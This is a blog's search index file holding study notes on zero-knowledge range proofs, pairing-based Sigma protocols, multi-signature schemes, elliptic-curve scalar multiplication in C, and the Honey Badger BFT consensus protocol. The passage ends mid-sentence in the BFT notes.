<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Some tricks about zk (1)</title>
      <link href="/2023/03/21/Some-tricks-about-zk-1/"/>
      <url>/2023/03/21/Some-tricks-about-zk-1/</url>
      
        <content type="html"><![CDATA[<h4 id="range-proof">Range Proof</h4><blockquote><p>based on Sigma Protocol</p></blockquote><p><strong>[前置知识]</strong></p><p><strong>u-ary</strong> representation: <span class="math inline">\(\sigma=\sum_j(\sigma_j u^j)\)</span></p><p>based on <strong>Boneh-Boyen</strong> signature scheme:</p><p>to show <span class="math inline">\(\sigma_j\in\{0,1,...,u-1\}\)</span> without revealing its value</p><ul><li><span class="math inline">\(x\)</span> is private key, <span class="math inline">\(A_i=g^{\frac{1}{x+i}}\)</span> (for <span class="math inline">\(\forall i\in\{0,1,...,u-1\}\)</span>)</li><li><span class="math inline">\(V_j=A_{\sigma_j}^{v_j}\)</span></li><li><span class="math inline">\(e(V_j,g^x)\overset{\text{?}}{=}e(V_j,g)^{-\sigma_j}\cdot e(g,g)^{v_j}\)</span>, <strong>(<span class="math inline">\(\Sigma\)</span> protocol format)</strong></li></ul><p>Obviously, <span class="math inline">\(e(g,g)^{\frac{x\cdot v_j}{x+\sigma_j}}=e(g,g)^{\frac{-\sigma_j\cdot v_j}{x+\sigma_j}}\cdot e(g,g)^{v_j}\)</span></p><p><strong>[正式协议]</strong></p><p>Prove <span class="math inline">\(\{(g,h\in\mathbb{G},u,l;\sigma,r\in\mathbb{Z}_p):C=g^\sigma h^r\and \sigma\in[0,u^l]\}\)</span></p><ul><li><p><span class="math inline">\(\mathcal{V}\rightarrow\mathcal{P}:\)</span></p><p>picks random <span class="math inline">\(x\in_R\mathbb{Z}_p\)</span></p><p>sends <span class="math inline">\(y=g^x\)</span> and <span class="math inline">\(A_i=g^{\frac{1}{x+i}}\)</span> (for <span class="math inline">\(\forall i\in\{0,1,...,u-1\}\)</span>)</p></li><li><p><span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:\)</span></p><p>picks <span class="math inline">\(v_j\in_R\mathbb{Z}_p\)</span></p><p>sends <span class="math inline">\(V_j=A_{\sigma_j}^{v_j}\)</span> (for <span class="math inline">\(\forall j\in\{0,1,...,l-1\}\)</span>)</p></li></ul><p>Turn to Prove <span class="math inline">\(\{(...,v_j):C=h^r\prod_j(g^{u^j})^{\sigma_j}\and V_j=g^{\frac{v_j}{x+\sigma_j}}\}\)</span></p><p><strong>(<span class="math inline">\(\Sigma\)</span> protocol format)</strong></p><ul><li><p><span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:\)</span></p><p>picks <span class="math inline">\(s_j,t_j,m_j\in_R\mathbb{Z}_p\)</span> (for <span class="math inline">\(\forall j\in\{0,1,...,l-1\}\)</span>)</p><p>sends <span class="math inline">\(a_j=e(V_j,g)^{-s_j}e(g,g)^{t_j}\)</span> and <span class="math inline">\(D=\prod_j(g^{u^j})^{s_j}h^{m_j}\)</span></p></li><li><p><span class="math inline">\(\mathcal{V}\rightarrow\mathcal{P}:\)</span></p><p>sends a random challenge <span class="math inline">\(c\in_R\mathbb{Z}_p\)</span></p></li><li><p><span class="math inline">\(\mathcal{P}\rightarrow\mathcal{V}:\)</span></p><p>sends <span class="math inline">\(z_{\sigma_j}=s_j-\sigma_j c\)</span>, <span class="math inline">\(z_{v_j}=t_j-v_j c\)</span>, <span class="math inline">\(z_r=m-rc\)</span></p></li><li><p><span class="math inline">\(\mathcal{V}:\)</span></p><p>checks that</p><ul><li><p><span class="math inline">\(D\overset{\text{?}}{=}C^ch^{z_r}\prod_j(g^{u^j})^{z_{\sigma_j}}\)</span></p></li><li><p><span class="math inline">\(a_j\overset{\text{?}}{=}e(V_j,y)^c\cdot e(V_j,g)^{-z_{\sigma_j}}\cdot e(g,g)^{z_{v_j}}\)</span></p><p>Obviously, <span class="math inline">\(e(V_j,y)^c=e(V_j,g)^c\cdot e(g,g)^{x}\)</span></p></li></ul></li></ul><p><img src= "/img/loading.gif" data-src="/2023/03/21/Some-tricks-about-zk-1/image-20230321112444145.png" alt="image-20230321112444145" style="zoom:50%;"></p><p>任意区间的范围证明转换对于Bullet Proof也同理</p><p><strong>[参考文献]</strong></p><p>Camenisch, J., Chaabouni, R., shelat, a. (2008). Efficient Protocols for Set Membership and Range Proofs. In: Pieprzyk, J. (eds) Advances in Cryptology - ASIACRYPT 2008. ASIACRYPT 2008. Lecture Notes in Computer Science, vol 5350. Springer, Berlin, Heidelberg. https://doi.org/10.1007/978-3-540-89255-7_15</p><h4 id="transform-bilinear-pairing-into-sigma-protocol-format">Transform bilinear pairing into Sigma Protocol Format</h4><p><span class="math inline">\(\Sigma=\{(w_a,w_b):e(a,b)=e(w_a,cg_2^{w_b})\}\)</span></p><p>picks <span class="math inline">\(r\in_{R}\mathbb{Z}_q\)</span>，computes <span class="math inline">\(x=c^{r},y=w_ag_1^r,z=rw_b\)</span></p><p>等价<span class="math inline">\(\Sigma&#39;=\{(z,w_b):\frac{e(y,c)}{e(a,b)}=\frac{e(g_1,xg_2^z)}{e(y,g_2)^{w_b}}\}\)</span></p><p>假设<span class="math inline">\(w_a=g_1^{w_a&#39;},c=g_2^{c&#39;}\)</span>，则（双线性对展开系数）有</p><p><span class="math inline">\((w_a&#39;+r)c&#39;-w_a&#39;(c&#39;+w_b)=(c&#39;r+rw_b)-(w_a&#39;+r)w_b\)</span>显然成立</p><p><span class="math inline">\(\Sigma&#39;\)</span> is <strong>in Sigma Protocol Format</strong> (with <span class="math inline">\(x,y\)</span> public)</p><p><strong>[参考文献]</strong></p><p>Y. Yu, Y. Zhao, Y. Li, X. Du, L. Wang and M. Guizani, "Blockchain-Based Anonymous Authentication With Selective Revocation for Smart Industrial Applications," in IEEE Transactions on Industrial Informatics, vol. 16, no. 5, pp. 3290-3300, May 2020, doi: 10.1109/TII.2019.2944678.</p><p><em>(page 5-6)</em></p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Note of RingCT 2.0</title>
      <link href="/2022/09/09/Note-of-RingCT-2-0/"/>
      <url>/2022/09/09/Note-of-RingCT-2-0/</url>
      
        <content type="html"><![CDATA[<div class="row">    <embed src="RingCT_2.0.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Overview of used cryptography concepts in blockchain</title>
      <link href="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/"/>
      <url>/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/</url>
      
        <content type="html"><![CDATA[<h3 id="signature-scheme">Signature Scheme</h3><ul><li><p>Multi-Signature ( &amp; aggregation )</p><p><strong>Schnorr</strong>: <a href="https://zhuanlan.zhihu.com/p/145550969" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/145550969</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/v2-c0e159da641a597a961580a4b35df889_1440w.jpg"></p><p>签名聚合(<span class="math inline">\(\sum\)</span>)及安全性分析：<a href="https://www.defidaonews.com/article/6684336" target="_blank" rel="noopener">https://www.defidaonews.com/article/6684336</a></p><p><span class="math inline">\(s\cdot G==R+Hash(R,X,m)\cdot X\)</span></p><p>Hash修正为公共<span class="math inline">\(Hash(\sum R,\sum X,m)\)</span>，且从signing阶段即统一修正</p><ul><li><p>通信开销（n节点）：</p><p>假设每个节点均共享<span class="math inline">\(R_i=k_i\cdot G\)</span>（<span class="math inline">\(O(n^2)\)</span>），则仅在其中一个节点上得到聚合签名的通信总开销为<span class="math inline">\(O(n^2+n)=O(n^2)\)</span></p><p>假设只向其中一个节点<span class="math inline">\(i\)</span>发送<span class="math inline">\(R_j\)</span>，由其聚合后，返回公共Hash，最后计算出<span class="math inline">\(s_j\)</span>由节点<span class="math inline">\(i\)</span>得到最终签名，通信总开销约为<span class="math inline">\(O(n+n+n)=O(n)\)</span></p></li><li><p>密钥消除攻击：e.g. 双节点情况下，伪造公钥为<span class="math inline">\(X_1-X_2\)</span>，使得仅私钥<span class="math inline">\(x_1\)</span>即可完成聚合签名</p><p>Q: 类比Bitcoin的<code>P2SH</code>，该攻击的前置条件是多重签名的地址对应的公钥已经是伪造后的公钥，也就是说需要受害者的资金转入到该多签地址中，暂待解决</p></li><li><p>签名使用的<span class="math inline">\(r\)</span>不随机（漏洞分析类似ECDSA）</p></li></ul><p><strong>MuSig</strong>: <a href="https://bitcoinops.org/en/topics/musig/" target="_blank" rel="noopener">https://bitcoinops.org/en/topics/musig/</a></p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906093644274.png"></p><p><strong>BLS</strong>: <a href="https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html" target="_blank" rel="noopener">https://crypto.stanford.edu/~dabo/pubs/papers/BLSmultisig.html</a></p><p>引入双线性对解决多轮通信开销问题</p><p><img src= "/img/loading.gif" data-src="/2022/09/06/Overview-of-used-cryptography-concepts-in-blockchain/image-20220906144538165.png"></p><p>基于BLS的门限签名：<a href="https://learnblockchain.cn/2019/08/29/bls" target="_blank" rel="noopener">https://learnblockchain.cn/2019/08/29/bls</a></p><p>VSS私钥片段分发的细节和Shamir门限方案基本一致（拉格朗日插值恢复多项式系数）</p><p>验证<span class="math inline">\(e(g\cdot(a_0+b_0+...),Hash(s))==e(g,Hash(s)\cdot(a_0+b_0+...))\)</span></p></li><li><p>Blind Signature</p></li><li><p>Ring Signature</p><p>建个新坑：<a href="https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25" target="_blank" rel="noopener">https://link.springer.com/chapter/10.1007/978-3-319-66399-9_25</a></p><p>看完门罗的RingCT回来补</p></li><li><p>Threshold Signature</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Engineering Practice of Cryptosystem(2)</title>
      <link href="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/"/>
      <url>/2022/07/20/Engineering-Practice-of-Cryptosystem-2/</url>
      
        <content type="html"><![CDATA[<h2 id="assignment">Assignment</h2><p>在实验室算法库（部分）的基础上实现</p><ul><li>椭圆曲线标量乘（方法选的Sliding window，但固定基点标量乘也需要用到w-NAF，就也实现了w-NAF）</li><li>上层SM2模块（数字签名+公钥加密）</li></ul><h2 id="record">Record</h2><h3 id="fp">fp</h3><p>有限域模块均采用Montgomery表示，即<span class="math inline">\(x\rightarrow x\cdot R\ (mod\ N)\)</span>，输出时（调用<code>fp_wt_bin</code>）再做Mont约简</p><p>本科毕设写的格密码库就基于Montgomery做了模约简，同时实现了AVX2的并行优化，但参照的是<strong>NFLlib</strong>的技术路线，不涉及多精度（Multiprecision Montgomery）</p><p>阅读<code>bn_mont_mul_low</code>函数的逻辑后，梳理如下：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161816.png"></p><h3 id="ecp">ecp</h3><h4 id="点加倍点">点加/倍点</h4><p>椭圆曲线模块下的点加基于雅可比坐标（为了避免仿射坐标下的求逆运算；无穷远点即<span class="math inline">\(Z=0\)</span>）</p><p>仿射坐标下： <span class="math display">\[\left\{\begin{aligned}\lambda &amp; =\frac{y_2-y_1}{x_2-x_1}\\x_3 &amp; =\lambda^2-x_1-x_2\\y_3 &amp; =\lambda(x_1-x_3)-y_1\end{aligned}\right.\]</span> 转化为雅可比坐标：<span class="math inline">\((X,Y)\rightarrow(X,Y,1)\)</span>，则点加运算过程如下：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161550.jpg"></p><p>倍点的推导类似，算法库提供的接口均已实现</p><h4 id="标量乘">标量乘</h4><p>翻出了大二买的《椭圆与超椭圆曲线公钥密码的理论与实现》...（吃灰</p><ul><li><p>Sliding Window</p><p><strong>Input</strong>: 椭圆曲线上的点P, 整数<span class="math inline">\(k=\sum_{j=0}^{l-1}k_j2^j\)</span></p><p><strong>Output</strong>: Q=[k]P</p><p>窗口上限=r（模数256-bit下，暂设r=5）</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720174702.jpg"></p><p><span class="math inline">\(k_j=1\)</span>时，可以在处理完<span class="math inline">\(h_j\)</span>那段后，直接再做<span class="math inline">\(t-(j-r+1)\)</span>次倍点运算，共计跳过二进制长度=r的窗口</p></li><li><p>w-NAF</p><p>设整数k为l比特长，则可将k写作SD表达式（binary signed digit representation）<span class="math inline">\(\sum_{j=0}^{l}s_j2^j,\ s_j\in\{-1,0,1\}\)</span></p><p>其中，若要求SD表达式是稀疏的（无任何两个非零值相邻），即为NAF表达式</p><p>在k的所有SD表达式中，NAF表达式的重量最小，且具备唯一性</p><p>将整数k转换为NAF表达式的实现如下（算法1）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ecp_to_wnaf</span><span class="params">(<span class="keyword">const</span> ecp_ctx* group, <span class="keyword">int8_t</span>* R, <span class="keyword">const</span> <span class="keyword">dig_t</span>* k)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// default NAF_2(k), i.e. w = 2</span></span><br><span class="line">    <span class="keyword">int</span> N_dig = group-&gt;N-&gt;digs;</span><br><span class="line">    <span class="keyword">dig_t</span> k_copy[MAX_BN_DIGS];</span><br><span class="line">    bn_copy(k_copy, k, N_dig);</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!bn_is_zero(k_copy, N_dig)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k_copy[<span class="number">0</span>] &amp; <span class="number">0x02</span>) &#123;</span><br><span class="line">                R[j++] = <span class="number">-1</span>;</span><br><span class="line">                bn_add_dig(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                R[j++] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            R[j++] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        bn_rsh_low(k_copy, k_copy, <span class="number">1</span>, N_dig);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>k_copy % 4 = 3</code>时，令<code>R[j]=-1</code>；<code>k_copy % 4 = 1</code>时，令<code>R[j]=1</code>；否则令<code>R[j]=0</code></p><p>迭代令<code>k_copy = (k_copy - R[j]) &gt;&gt; 1</code>（由于k_copy为奇时，减去R[j]使得其%4=0，因此下一次的k_copy必为偶，保证了NAF的稀疏性），最后输出的<code>R[j]</code>即为NAF表达式的<span class="math inline">\(s_j\)</span></p><p>IEEE P1363标准中还有另一种隐式转化为NAF的方法（算法2）：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/Snipaste_2022-07-20_20-38-10.jpg"></p><p>对于算法2生成的NAF表达式正确性证明如下（即证明<span class="math inline">\(d_j=s_j\)</span>）：</p><p><img src= "/img/loading.gif" data-src="/2022/07/20/Engineering-Practice-of-Cryptosystem-2/QQ图片20220720161824.png"></p><p>测试后发现基于算法2的w-NAF标量乘要略快于算法1（w=2），而且滑动窗口法也比w-NAF要略快</p></li><li><p>固定基点G</p><p>设基点G的阶有n-bit，则预计算所有的<span class="math inline">\([2]P,[2^2]P,...,[2^{n}P]\)</span></p><p>调用标量乘时，再将k转换为NAF表示，在每个不为0的位上进行单次点加即可</p></li></ul><h3 id="sm2">sm2</h3><p>略</p>]]></content>
      
      
      <categories>
          
          <category> Postgraduate </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Research on aBFT</title>
      <link href="/2021/12/06/Research-on-aBFT/"/>
      <url>/2021/12/06/Research-on-aBFT/</url>
      
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3><blockquote><p>https://medium.com/<span class="citation" data-cites="crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a">@crytpol_25852/asynchronous-byzantine-fault-tolerance-a-time-independent-future-proof-byzantine-fault-f6f1a4d1f17a</span></p><p>Nonetheless, all these protocols employ at their core a synchronous (or partially/weak synchronous) BFT consensus algorithm which makes them unsuitable for TRULY permissionless blockchain settings where “network links can be unreliable, network speeds change rapidly, and network delays may even be adversarially induced” ¹⁷. All these BFT variants might be prepared to tolerate malfunction faults due to adversarial collusion or damage in the nodes according to the classical definition of a byzantine attack but the internet has taught us that byzantine behavior can evolve beyond to what a legacy understanding of what is a byzantine attack could have predicted. For instance, Botnetsd¹⁸ and Distributed Denial of Service (DDoS) attacks can easily be used to flood with packets an important node involved heavily in consensus and thus delaying the transmission of packets said node must send/receive for the network to achieve consensus, leading to the halting of the entire network. In this scenario is evident that synchronous consensus algorithms are susceptible to time-delayed attack due to the fact that the transmission of messages needed to achieve consensus are time-bounded. Therefore, synchronous BFT consensus algorithms are not the strongest form BFT because time-assumption are made which makes provably impossible to guarantee liveness in adversarial settings where time-based attacks are constant as can certainly happen when we use the internet¹⁹.</p></blockquote><p>BFT protocols which can run in <em>asynchronous</em> networks are particularly robust against attacks that can be mounted over public networks. Such asynchronous BFT (<strong>aBFT</strong>) protocols ensure that transactions are processed without timing assumptions.</p><p><strong>异步（Asynchronous）</strong>环境下只保证消息最终能够到达，但没有对于到达时间的限制。aBFT在设计上需要保证共识系统不会丧失活性。</p><h3 id="honey-badger-bft">Honey Badger BFT</h3><p>核心模块→异步共同子集协议（Asynchronous Common Subset, ACS），且HB-BFT将ACS协议分割为两个子模块：</p><p>在第一阶段，每个节点使用RBC协议（Reliable Broadcast）将本地的proposal广播给其他节点；在第二阶段，每个节点都并行执行n个ABA协议（Asynchronous Binary Agreement），来共识一个<strong>位向量</strong>（用于表示哪些RBC已成功）</p><p>门限加密模块↓</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-03_18-02-44.png"></p><h4 id="main-procedure">Main Procedure</h4><p>完整的Honey Badger BFT流程如下：</p><ol type="1"><li>每个节点从本地交易池（buf）中随机选取<span class="math inline">\(\lfloor B/N\rfloor\)</span>个交易，作为<span class="math inline">\(proposed\)</span>。并使用门限加密模块Setup后的共享公钥<span class="math inline">\(PK\)</span>对<span class="math inline">\(proposed\)</span>进行加密→<span class="math inline">\(x\)</span>；</li><li>每个节点都并行执行<span class="math inline">\(\{RBC_i\}_N,\{ABA_i\}_N\)</span>，组成ACS模块。将<span class="math inline">\(x\)</span>作为各自ACS模块的输入（实际上对于节点<span class="math inline">\(\mathcal{P}_j\)</span>，即作为本地<span class="math inline">\(RBC_j\)</span>的输入，见Figure_4），得到系统共识“YES”后的<em>enc_proposed</em>集合；</li><li>对Step 2输出的<em>enc_proposed</em>集合进行遍历处理：广播自己的秘密份额<span class="math inline">\(e_j\)</span>，并通过f+1份share message解密得到明文交易集；</li><li>排序交易集，写入区块（但官方论文中的e.g. lexicographically有点迷惑哈...区块交易可以这么定序的嘛❓）</li><li>从本地交易池中remove已确认交易；</li></ol><figure><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_5_Figure_1.png" alt="Figure_1"><figcaption aria-hidden="true">Figure_1</figcaption></figure><h4 id="acs-asynchronous-common-subset">ACS (Asynchronous Common Subset)</h4><p>Ben-Or等人设计了下述协议，来达成容量至少为<span class="math inline">\(N-f\)</span>的子集共识。（<span class="math inline">\(N-f\)</span>为最大容错下的诚实节点数）</p><p>for party <span class="math inline">\(\mathcal{P}_i\)</span>：</p><ol type="1"><li><p>本地输入，作为<span class="math inline">\(RBC_i\)</span>的输入；</p></li><li><p><span class="math inline">\(RBC_j\)</span>执行成功，将<span class="math inline">\(ABA_j\)</span>的输入置1；</p></li><li><p>至少<strong><span class="math inline">\(N-f\)</span>个<span class="math inline">\(ABA\)</span>实例</strong>执行完成时，将其他<span class="math inline">\(ABA\)</span>实例输入均置0；</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_13-58-02.png"></p><p>上图为官方论文的解释，由此对登链社区<a href="https://learnblockchain.cn/article/2494#ACS--Asynchronous-Common-Subset-" target="_blank" rel="noopener">https://learnblockchain.cn/article/2494#ACS--Asynchronous-Common-Subset-</a>一文中该点相关的描述作出勘误：</p><p>若在<span class="math inline">\(N-f\)</span>个<span class="math inline">\(RBC\)</span>实例成功后就将其他<span class="math inline">\(ABA\)</span>输入置0，将可能出现以下情况：</p><p>  在诚实节点<span class="math inline">\(\mathcal{P}_i\)</span>上，有诚实节点<span class="math inline">\(\mathcal{P}_j\)</span>对应的<span class="math inline">\(RBC_{j}\)</span>还未执行成功，但已有其他<span class="math inline">\(N-f\)</span>个诚实节点对应的<span class="math inline">\(RBC\)</span>执行成功➡<span class="math inline">\(ABA_j\)</span>的输入置0；</p><p>  假如存在若干诚实节点本地运行的<span class="math inline">\(RBC_j\)</span>出现上述<span class="math inline">\(\mathcal{P}_i\)</span>的情况，导致<span class="math inline">\(ABA_j\)</span>的共识过程收不到<span class="math inline">\(N-f\)</span>条<span class="math inline">\(Aux(1)\)</span>➡<span class="math inline">\(ABA_j\)</span>的输出为0（<strong>本应该为1</strong>）；</p><p>  <strong>由于每个诚实节点本地<span class="math inline">\(N-f\)</span>个<span class="math inline">\(RBC\)</span>实例执行成功的顺序可能不同</strong>，因此考虑最坏情况，可能出现论文中说的"the resulting bit vector could be <strong>empty</strong>"</p><p>回到Figure_4的实现，若改为在<span class="math inline">\(N-f\)</span>个<span class="math inline">\(ABA\)</span>实例成功（输出1）后，再将其余未开始执行的<span class="math inline">\(ABA\)</span>输入置0，则<strong>至少能保证<span class="math inline">\(size(resulting\ bit\ vector)\)</span>为<span class="math inline">\(N-f\)</span></strong>。且如果不考虑最坏情况（即某个诚实节点对应的<span class="math inline">\(RBC\)</span>在很多节点上直到<span class="math inline">\(N-f\)</span>个<span class="math inline">\(ABA\)</span>均已输出1还未执行成功），则延迟较大的情况下将出现下述情况（仍能output 1）：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-44-28.png"></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-56-51.png"></p></li><li><p>当所有<span class="math inline">\(ABA\)</span>实例执行完成后，输出为1的<span class="math inline">\(ABA\)</span>下标映射到最终的<em>enc_proposed</em>集合；</p></li></ol><figure><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_7_Figure_4.png" alt="Figure_4"><figcaption aria-hidden="true">Figure_4</figcaption></figure><h4 id="rbc-reliable-broadcast">RBC (Reliable Broadcast)</h4><p>RBC协议可保证将消息可靠地发送至网络中的所有节点。</p><p>Honey Badger BFT中的RBC协议设计如下：</p><ol type="1"><li><p>本地输入，基于<span class="math inline">\((N-2f,N)\)</span>纠删码进行分割，并计算N份叶节点<span class="math inline">\(\{s_j\}_N\)</span>对应的Merkle Root <span class="math inline">\(h\)</span>，向节点<span class="math inline">\(\mathcal{P}_j\)</span>发送<span class="math inline">\(VAL(h,b_j,s_j)\)</span></p><p>其中<span class="math inline">\(VAL\)</span>是消息类型名，<span class="math inline">\(b_j\)</span>为Merkle Tree从根到<span class="math inline">\(s_j\)</span>的对应分支，示例如下：</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/0_EBENZgjKN5XMEJ8m.png" style="zoom:33%;"></p><blockquote><p>If we would receive the block <em>L4,</em> we would only need <em>Hash 1–0</em> and <em>Hash 0</em> to verify that block <em>L4</em> is valid for the root hash.</p></blockquote></li><li><p>收到<span class="math inline">\(VAL\)</span>包后广播对应<span class="math inline">\(ECHO\)</span>包；</p></li><li><p>收到<span class="math inline">\(ECHO\)</span>包后校验Merkle Tree的分支，不合法则丢弃；</p></li><li><p>当收集满<span class="math inline">\(N-f\)</span>（i.e. <span class="math inline">\(2f+1\)</span>）个合法<span class="math inline">\(ECHO\)</span>包后，从任意<span class="math inline">\(f+1\)</span>个恢复出完整的<span class="math inline">\(N\)</span>个叶节点<span class="math inline">\(\{s_j^{&#39;}\}\)</span>，并验证Merkle Root是否一致，若一致则广播<span class="math inline">\(READY\)</span>包；</p><p><strong>Q: 为什么纠删码采用<span class="math inline">\(f+1\)</span>（i.e. <span class="math inline">\(N-2f\)</span>），论文中暂未找到说明</strong></p></li><li><p>对于<strong>延迟较大</strong>的节点，若在收到<span class="math inline">\(N-f\)</span>个合法<span class="math inline">\(ECHO\)</span>包前，先收到了<span class="math inline">\(f+1\)</span>个<span class="math inline">\(READY\)</span>包，则说明至少由一个诚实节点发出，将同样广播<span class="math inline">\(READY\)</span>包；</p></li><li><p>等待收到<span class="math inline">\(2f+1\)</span>个<span class="math inline">\(READY\)</span>包，若已收到<span class="math inline">\(N-2f\)</span>个合法<span class="math inline">\(ECHO\)</span>包，则恢复出对应完整输入，否则继续等待足够的<span class="math inline">\(ECHO\)</span>包；</p></li></ol><figure><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_6_Figure_2.png" alt="Figure_2"><figcaption aria-hidden="true">Figure_2</figcaption></figure><h4 id="aba-asynchronous-binary-agreement">ABA (Asynchronous Binary Agreement)</h4><p><span class="math inline">\(ABA\)</span>协议（如图示）对<strong>单个bit</strong>作出共识（r means the round number）</p><p>HB-BFT使用的ABA协议参考自</p><blockquote><p>A. Mostefaoui, H. Moumen, and M. Raynal. Signature-free asynchronous byzantine consensus with t&lt; n/3 and o (n 2) messages. In Proceedings of the 2014 ACM symposium on Principles of distributed computing, pages 2–9. ACM, 2014.</p></blockquote><p>初始化<span class="math inline">\(est_{0}\)</span>为该<span class="math inline">\(ABA\)</span>实例的输入，进入下面的循环：</p><ol type="1"><li><p>广播<span class="math inline">\(BVAL_{r}(est_r)\)</span>；</p><p><span class="math inline">\(BVAL\)</span> probably means BIT_VALUE</p></li><li><p>令<span class="math inline">\(bin\_values_r\)</span>为空集；</p></li><li><p>当收到来自<span class="math inline">\(f+1\)</span>个节点的<span class="math inline">\(BVAL_r(b)\)</span>时，证明至少由一个诚实节点发出，若未发送过<span class="math inline">\(BVAL_r(b)\)</span>，则广播该消息；</p></li><li><p>当收到来自<span class="math inline">\(2f+1\)</span>个节点的<span class="math inline">\(BVAL_r(b)\)</span>时，将<span class="math inline">\(b\)</span>加入集合<span class="math inline">\(bin\_values_r\)</span>；</p></li><li><p>当<span class="math inline">\(bin\_values_r\)</span>不为空集时：</p><ul><li><p>广播<span class="math inline">\(AUX_r(w)\)</span>，<span class="math inline">\(w\in bin\_values_r\)</span>；</p></li><li><p>等待，直到收到<span class="math inline">\(n-f\)</span>(i.e. <span class="math inline">\(2f+1\)</span>)条<span class="math inline">\(AUX_r\)</span>消息（其中包含的值构成集合<span class="math inline">\(vals\)</span>），需要满足<span class="math inline">\(vals\sub bin\_values_r\)</span>；</p></li></ul><p>注意(5)在监听等待时，(3)(4)仍在运行，因此<span class="math inline">\(bin\_values_r\)</span>可能变化（存在部分<span class="math inline">\(AUX_r\)</span>消息携带的值满足<span class="math inline">\(\in bin\_values_r\)</span>，被加入计数）⬅ 解释了原文为何说"this condition may be triggered upon arrival of either an AUX or an BVAL"；</p><p>但(5)不会随着<span class="math inline">\(bin\_values_r\)</span>的变化再次广播 ⬅ 每个诚实节点只会选择一个<span class="math inline">\(w\)</span>，广播<span class="math inline">\(AUX_r(w)\)</span>；</p><ul><li><p>获取随机源s（见Figure_12）</p></li><li><p>若<span class="math inline">\(\mid vals\mid=2\)</span>，令下一轮的<span class="math inline">\(est_{r+1}=s\)</span>；</p><p>若<span class="math inline">\(\mid vals\mid=1,vals=\{v\}\)</span>，令<span class="math inline">\(est_{r+1}=v\)</span>，若<span class="math inline">\(v=s\%2\)</span>，输出<span class="math inline">\(v\)</span>，否则继续循环；</p></li></ul></li></ol><figure><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_11.png" alt="Figure_11"><figcaption aria-hidden="true">Figure_11</figcaption></figure><p>ABA的正确性证明可以移步<a href="https://zhuanlan.zhihu.com/p/46274211" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46274211</a></p><p>PBFT等弱同步共识算法中若无法收到相同VOTE的<span class="math inline">\(2f+1\)</span>条信息（假设<span class="math inline">\(f\)</span>个拜占庭节点均不发消息，而<span class="math inline">\(2f+1\)</span>个诚实节点间存在不一致VOTE👈下面解释），则引入定时器timer来解决无法达成共识的问题；</p><p>这里解释一下为什么存在诚实节点分歧👉e.g. 